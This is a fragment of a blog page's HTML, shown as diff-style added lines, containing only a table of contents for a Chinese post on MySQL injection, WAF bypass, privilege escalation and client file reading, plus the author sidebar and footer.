href="#select注入"><span class="nav-number">1.3.1.</span> <span class="nav-text">select注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#insert注入、update注入"><span class="nav-number">1.3.2.</span> <span class="nav-text">insert注入、update注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by注入"><span class="nav-number">1.3.3.</span> <span class="nav-text">order by注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit注入"><span class="nav-number">1.3.4.</span> <span class="nav-text">limit注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF绕过"><span class="nav-number">1.4.</span> <span class="nav-text">WAF绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">1.4.1.</span> <span class="nav-text">黑名单绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#敏感字符过滤"><span class="nav-number">1.4.2.</span> <span class="nav-text">敏感字符过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单引号被转义"><span class="nav-number">1.4.3.</span> <span class="nav-text">单引号被转义</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御措施"><span class="nav-number">1.5.</span> <span class="nav-text">防御措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#版本区别"><span class="nav-number">1.6.</span> <span class="nav-text">版本区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-0以上与5-0以下版本的区别"><span class="nav-number">1.6.1.</span> <span class="nav-text">5.0以上与5.0以下版本的区别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-提权"><span class="nav-number">2.</span> <span class="nav-text">0x02 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF提权"><span class="nav-number">2.1.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前提条件"><span class="nav-number">2.1.1.</span> <span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权过程"><span class="nav-number">2.1.2.</span> <span class="nav-text">提权过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具利用"><span class="nav-number">2.1.3.</span> <span class="nav-text">工具利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mof提权"><span class="nav-number">2.2.</span> <span class="nav-text">mof提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提权过程-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">提权过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具利用-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">工具利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell提权"><span class="nav-number">2.3.</span> <span class="nav-text">webshell提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提权流程"><span class="nav-number">2.3.1.</span> <span class="nav-text">提权流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-客户端攻击"><span class="nav-number">3.</span> <span class="nav-text">0x03 客户端攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql客户端任意文件读取"><span class="nav-number">3.1.</span> <span class="nav-text">mysql客户端任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用流程"><span class="nav-number">3.1.1.</span> <span class="nav-text">利用流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
